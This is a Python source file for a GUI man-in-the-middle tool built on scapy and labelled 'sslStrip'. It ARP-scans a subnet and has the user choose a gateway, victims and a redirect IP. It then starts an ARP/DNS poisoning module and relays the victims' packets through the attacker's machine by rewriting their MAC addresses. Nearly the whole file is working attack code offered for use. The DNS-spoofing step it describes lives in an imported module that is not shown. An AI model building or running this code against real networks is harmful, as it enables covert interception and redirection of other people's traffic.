from scapy.all import *
from dnsarp import dnsarp
import threading
from Tkinter import*
import sys
import os

class sslStrip():
    
    def __init__(self, interface, root):
        self.interface = interface
        self.root = root
        
    def multiple_url(self):
        for widget in self.root.winfo_children():
            widget.destroy()
        Label(self.root, text='Please enter the URLs of websites. For example, facebook.com ').pack()
        scroll = Scrollbar(self.root)
        self.eula = Text(self.root, wrap=NONE, yscrollcommand=scroll.set)
        scroll.config(command=self.eula.yview)
        self.eula.pack()
        def get_multiple(self):
            self.full_list=[]
            self.line_list = self.eula.get('1.0', 'end').split('\n')
            for self.line in self.line_list:
                self.full_list.append(self.line)
            for self.line in self.full_list:
                if self.line != '':
                    self.url.append(self.line)
            self.ownMAC = get_if_hwaddr(self.interface)
            self.startProcess()
        def restart_program(self):
            python =sys.executable
            os.execl(python, python, * sys.argv)
        Button(self.root, text="Reset", command=lambda:restart_program(self)).pack(side=BOTTOM)
        Button(self.root, text="Submit", command=lambda: get_multiple(self)).pack()
        
    def url_y_n(self):
        for widget in self.root.winfo_children():
            widget.destroy()

        def set_y_n(self, s):
            input_choice = s
            #url contains all urls to redirect to the ip address specified above
            self.url = []
            if (input_choice == "y"):
                self.multiple_url()
            else:
            #get own MAC address
                self.ownMAC = get_if_hwaddr(self.interface)
                self.startProcess()

        def restart_program(self):
            python =sys.executable
            os.execl(python, python, * sys.argv)
        Button(self.root, text="Reset", command=lambda:restart_program(self)).pack(side=BOTTOM)

        Label(self.root, text='Do you want to selects URLs to redirect manually?').pack()
        Button(self.root, text="Yes", command=lambda: set_y_n(self, "y")).pack()
        Button(self.root, text="No", command=lambda: set_y_n(self, "n")).pack()
        
        
    def website_ip(self):
        for widget in self.root.winfo_children():
            widget.destroy()
        ipLabel = Label(self.root,
                        text='Enter the ip address of the website to where the user should be redirected:').pack()
        ipValue = Entry(self.root)
        ipValue.pack()

        def get_execute(self):
            self.ip_website = ipValue.get()
            for widget in self.root.winfo_children():
                widget.destroy()
            self.url_y_n()

        def restart_program(self):
            python =sys.executable
            os.execl(python, python, * sys.argv)
        Button(self.root, text="Reset", command=lambda:restart_program(self)).pack(side=BOTTOM)
        Button(self.root, text="Execute", command=lambda:get_execute(self)).pack()        
        
        
    def select_target(self):
        for widget in self.root.winfo_children():
            widget.destroy()
            
        self.target = []
        Label(self.root, text='Select the target IP').pack()
        OPTIONS = []
        for packet_sent, packet_received in self.ips_used:
            OPTIONS.append(packet_received[ARP].psrc)

        select = Listbox(self.root, selectmode="multiple", width=100)
        for each_item in range(len(OPTIONS)):
            select.insert(END, OPTIONS[each_item])
        select.pack()
        
        def get_select(self):
            for i in select.curselection():
                inputInt = int(i)
                self.target.append(
                    {"ip": self.ips_used[inputInt][1][ARP].psrc, "mac": self.ips_used[inputInt][1][ARP].hwsrc})
            self.website_ip()

        def restart_program(self):
            python =sys.executable
            os.execl(python, python, * sys.argv)
            
        Button(self.root, text="Reset", command=lambda:restart_program(self)).pack(side=BOTTOM)
        Button(self.root, text="Execute", command=lambda:get_select(self)).pack()
        
        
    def get_gateway(self):
        #now we will select the default gateway
        self.defaultGateway = []
        Label(self.root, text='Select one IP of the default gateway').pack()
        OPTIONS = []
        for packet_sent, packet_received in self.ips_used:
            OPTIONS.append(packet_received[ARP].psrc)

        select = Listbox(self.root, selectmode="single", width=100)
        for each_item in range(len(OPTIONS)):
            select.insert(END, OPTIONS[each_item])
        select.pack()

        def get_select(self):
            for i in select.curselection():
                inputInt = int(i)
                self.defaultGateway.append(
                    {"ip": self.ips_used[inputInt][1][ARP].psrc, "mac": self.ips_used[inputInt][1][ARP].hwsrc})
            self.select_target()

        def restart_program(self):
            python =sys.executable
            os.execl(python, python, * sys.argv)
        Button(self.root, text="Reset", command=lambda:restart_program(self)).pack(side=BOTTOM)

        Button(self.root, text="Execute", command=lambda:get_select(self)).pack()

    def get_IP(self):
        ipLabel = Label(self.root,
            text='Enter the range of IP addresses that you want to use (example: 192.168.5.85/24)').pack()
        ipValue = Entry(self.root)
        ipValue.pack()
        
        def get_execute(self):
            self.ip_range = ipValue.get()
            self.ips_used, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=self.ip_range), timeout=3,
                                   iface=self.interface)
            for widget in self.root.winfo_children():
                widget.destroy()
            self.get_gateway()

        def restart_program(self):
            python =sys.executable
            os.execl(python, python, * sys.argv)
        Button(self.root, text="Reset", command=lambda:restart_program(self)).pack(side=BOTTOM)
        Button(self.root, text="Execute", command=lambda:get_execute(self)).pack()
    
    
    def getInput(self):
        self.get_IP()
        

    def startProcess(self):
        arpprocess = dnsarp(self.interface)
        arpprocess.setInput(self.ip_range, self.ips_used, self.defaultGateway, self.target, self.ownMAC, "y", "loud")
        proc_thread = None
        proc_thread = threading.Thread(target=arpprocess.startProcess)
        proc_thread.daemon = True
        proc_thread.start()
        for widget in self.root.winfo_children():
            widget.destroy()
      
        scroll = Scrollbar(self.root)
        def restart_program(self):
            python =sys.executable
            os.execl(python, python, * sys.argv)
        self.re = Button(self.root, text="Reset", command=lambda:restart_program(self))
        self.re.pack(side=BOTTOM)
        self.eula = Text(self.root, wrap=NONE, yscrollcommand=scroll.set)
        scroll.config(command=self.eula.yview)
        self.eula.pack()
        self.eula.insert(END, "DNS sniffing has started" + '\n')
        self.eula.see(END)
        self.eula.update_idletasks()
        while True:
            sniff(store=0, prn=lambda packet: self.doSpoofing(packet), iface=self.interface)

    #method which does the DNS spoofing of a packet
    def doSpoofing(self, packet):
        self.root.update()
        #checks whether it is a correct packet
        if packet.haslayer(Ether) and packet.haslayer(IP):
            try:
                if(packet[Ether].src == self.defaultGateway[0]["mac"]):
                    packet[Ether].src = packet[Ether].dst
                    for tar in self.target:
                        if tar["ip"] == packet[IP].dst:
                            packet[Ether].dst = tar["mac"]
                    sendp(packet, iface=self.interface, verbose=False)
                else:
                    for tar in self.target:
                        if tar["mac"] == packet[Ether].src:
                            packet[Ether].src = self.ownMAC
                            packet[Ether].dst = self.defaultGateway[0]["mac"]
                            sendp(packet, iface=self.interface, verbose=False)
            except:
                print("Disaster")
                
            

                
            
               
            

                
            
